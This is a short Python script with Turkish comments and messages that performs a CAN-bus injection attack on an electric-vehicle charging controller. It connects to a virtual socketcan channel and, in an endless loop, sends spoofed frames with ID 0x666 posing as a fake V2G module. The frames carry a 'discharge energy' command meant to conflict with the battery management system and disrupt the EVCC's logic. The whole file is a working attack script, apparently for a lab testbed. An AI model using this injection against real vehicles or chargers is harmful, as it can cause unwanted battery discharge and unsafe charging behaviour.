import can
import time

def start_ghost_attack():
    bus = can.interface.Bus(channel='vcan0', bustype='socketcan')
    
    # ID 0x666: Sahte (Hayalet) V2G Modülü
    # Data [0x02]: "Enerji VER / Deşarj Et" komutu (BMS ile çelişir)
    msg = can.Message(arbitration_id=0x666, data=[0x02], is_extended_id=False)
    
    print("SALDIRI BAŞLADI: Hayalet V2G sinyalleri basılıyor (ID: 0x666)...")
    print("Hedef: EVCC'nin mantığını bozmak.")
    
    try:
        while True:
            bus.send(msg)
            # Saldırgan mesajı sürekli ağa basıyor
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("\nSaldırı durduruldu.")

if __name__ == "__main__":
    start_ghost_attack()